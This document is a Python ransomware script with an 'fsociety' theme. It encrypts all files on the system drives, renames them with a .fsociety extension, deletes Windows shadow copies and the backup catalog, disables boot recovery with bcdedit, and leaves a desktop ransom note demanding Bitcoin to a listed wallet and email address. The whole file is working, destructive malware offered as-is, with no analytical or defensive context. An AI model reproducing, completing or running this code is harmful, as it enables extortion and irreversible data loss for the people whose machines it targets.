import os
import sys
import threading
import subprocess
from cryptography.fernet import Fernet
import getpass

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
        self.password = "fsociety"
        
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            self.encrypted_files.append(file_path)
            os.rename(file_path, file_path + '.fsociety')
        except:
            pass

    def encrypt_directory(self, path):
        for root, _, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                if not file_path.endswith('.fsociety'):
                    self.encrypt_file(file_path)

    def ransom_note(self):
        note = f"""
        ALL YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE ENCRYPTION

        To decrypt your files and regain access, you must pay 0.5 BTC to:
        bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq

        After payment, email your transaction ID to decrypt@fsociety.xyz
        Include this ID: {self.key.decode()}

        If no payment is received within 72 hours, your decryption key will be destroyed
        and your data will be permanently lost.

        Password for decryption attempt: {self.password}
        """
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        with open(os.path.join(desktop, "README_FSOCIETY.txt"), 'w') as f:
            f.write(note)
        
        for _ in range(3):
            subprocess.Popen(['notepad.exe', os.path.join(desktop, "README_FSOCIETY.txt")])

    def destroy_shadows(self):
        if os.name == 'nt':
            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], shell=True)
            subprocess.run(['wbadmin', 'delete', 'catalog', '-quiet'], shell=True)

    def disable_recovery(self):
        if os.name == 'nt':
            subprocess.run(['bcdedit', '/set', '{default}', 'recoveryenabled', 'no'], shell=True)
            subprocess.run(['bcdedit', '/set', '{default}', 'bootstatuspolicy', 'ignoreallfailures'], shell=True)

    def execute(self):
        self.destroy_shadows()
        self.disable_recovery()
        
        drives = ['C:', 'D:', 'E:', 'F:'] if os.name == 'nt' else ['/']
        for drive in drives:
            if os.path.exists(drive):
                self.encrypt_directory(drive)
        
        self.ransom_note()
        
        with open(os.path.expanduser("~") + '/key.bin', 'wb') as f:
            f.write(self.key)

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.execute()
